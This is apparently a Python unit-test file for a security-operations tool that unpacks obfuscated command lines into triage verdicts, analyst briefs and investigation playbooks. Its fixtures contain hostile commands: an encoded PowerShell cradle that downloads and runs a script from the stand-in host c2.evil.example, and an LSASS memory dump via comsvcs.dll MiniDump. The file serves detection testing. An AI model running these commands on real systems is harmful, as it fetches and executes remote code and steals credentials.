"""Tests for Attack-Chain Correlator and L1/L2 Investigation Playbook Engine."""

from __future__ import annotations

import base64
import unittest

from cmd_unmask.models import PayloadNode, Severity, TriageVerdict, UnpackingDAG
from cmd_unmask.renderer import build_soc_ticket_note, render_markdown, render_pretty
from cmd_unmask.unpacker import unmask_command


class TestAttackChainCorrelator(unittest.TestCase):
    """Verify deterministic executive brief synthesis and artifact-grounded playbook steps."""

    def test_triage_verdict_defaults_and_to_dict_includes_brief_and_playbook(self) -> None:
        node = PayloadNode(node_id="node_0", text="ipconfig /all", depth=0)
        dag = UnpackingDAG(root_id="node_0", nodes={"node_0": node}, primary_leaf_id="node_0")
        verdict = TriageVerdict(
            source_id="corr-def-1",
            original_command="ipconfig /all",
            primary_unmasked_payload="ipconfig /all",
            dag=dag,
        )
        self.assertEqual(verdict.executive_brief, "")
        self.assertEqual(verdict.playbook_steps, [])
        payload = verdict.to_dict()
        self.assertIn("executive_brief", payload)
        self.assertIn("playbook_steps", payload)

    def test_multistage_office_phishing_chain_brief_and_artifact_playbook(self) -> None:
        inner = (
            "(New-Object Net.WebClient).DownloadFile('http://c2.evil.example:8080/stage.ps1', "
            "'C:\\Users\\Public\\stage.ps1'); IEX (Get-Content C:\\Users\\Public\\stage.ps1)"
        )
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        cmd = f"powershell.exe -NoP -W Hidden -enc {b64}"
        verdict = unmask_command(
            cmd,
            source_id="phish-1",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        self.assertIn("WINWORD.EXE", verdict.executive_brief)
        self.assertIn("c2.evil.example", verdict.executive_brief)
        joined_steps = "\n".join(verdict.playbook_steps)
        self.assertIn("WINWORD.EXE", joined_steps)
        self.assertIn("c2[.]evil[.]example", joined_steps)
        self.assertIn("C:\\Users\\Public\\stage.ps1", joined_steps)

    def test_lsass_credential_dump_and_masquerading_playbook(self) -> None:
        cmd = r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full"
        verdict = unmask_command(
            cmd,
            source_id="lsass-1",
            image=r"C:\Users\Public\rundll32.exe",
        )
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        self.assertIn("masquerading", verdict.executive_brief.lower())
        joined_steps = "\n".join(verdict.playbook_steps)
        self.assertIn("isolate", joined_steps.lower())
        self.assertIn("credential", joined_steps.lower())
        self.assertIn(r"C:\Users\Public\rundll32.exe", joined_steps)

    def test_benign_va_audit_and_plain_admin_brief_and_playbook(self) -> None:
        va_cmd = (
            "powershell.exe -NoP -Command \"\n"
            "$code = @'\n"
            "[DllImport(\"Netapi32.dll\")] public static extern int NetGetJoinInformation(string s, out IntPtr b, out int t);\n"
            "'@\n"
            "Add-Type -TypeDefinition $code\n"
            "\""
        )
        va_verdict = unmask_command(va_cmd, source_id="va-corr-1")
        self.assertEqual(va_verdict.severity, Severity.BENIGN)
        self.assertIn("Authorized VA Audit Baseline", va_verdict.executive_brief)
        self.assertTrue(any("scan" in s.lower() or "va" in s.lower() for s in va_verdict.playbook_steps))

        plain_verdict = unmask_command("ipconfig /all", source_id="plain-corr-1")
        self.assertEqual(plain_verdict.severity, Severity.BENIGN)
        self.assertIn("benign", plain_verdict.executive_brief.lower())
        self.assertGreaterEqual(len(plain_verdict.playbook_steps), 1)


class TestBriefAndPlaybookRenderer(unittest.TestCase):
    """Verify [ANALYST EXECUTIVE BRIEF] and [RECOMMENDED L1/L2 NEXT STEPS] rendering."""

    def test_malicious_multistage_renders_brief_and_playbook_in_pretty_markdown_and_note(self) -> None:
        inner = "(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
        verdict = unmask_command(
            f"powershell.exe -NoP -W Hidden -enc {b64}",
            source_id="ren-mal-1",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        pretty = render_pretty([verdict], color=False)
        md = render_markdown([verdict])
        note = build_soc_ticket_note(verdict)

        self.assertIn("Exec Brief    :", pretty)
        self.assertIn("[2] IOCs & NEXT STEPS", pretty)
        self.assertIn("WINWORD.EXE", pretty)
        self.assertIn("c2[.]evil[.]example", pretty)

        self.assertIn("Analyst Executive Brief", md)
        self.assertIn("Recommended L1/L2 Next Steps", md)
        self.assertIn("WINWORD.EXE", md)

        self.assertIn("Exec Brief    :", note)
        self.assertIn("Next Steps    :", note)
        self.assertIn("c2[.]evil[.]example", note)

    def test_benign_renders_clean_brief_and_playbook(self) -> None:
        verdict = unmask_command("ipconfig /all", source_id="ren-ben-1")
        pretty = render_pretty([verdict], color=False)
        self.assertIn("Exec Brief    :", pretty)
        self.assertIn("[2] IOCs & NEXT STEPS", pretty)
        self.assertIn("Benign administrative", pretty)


if __name__ == "__main__":
    unittest.main()
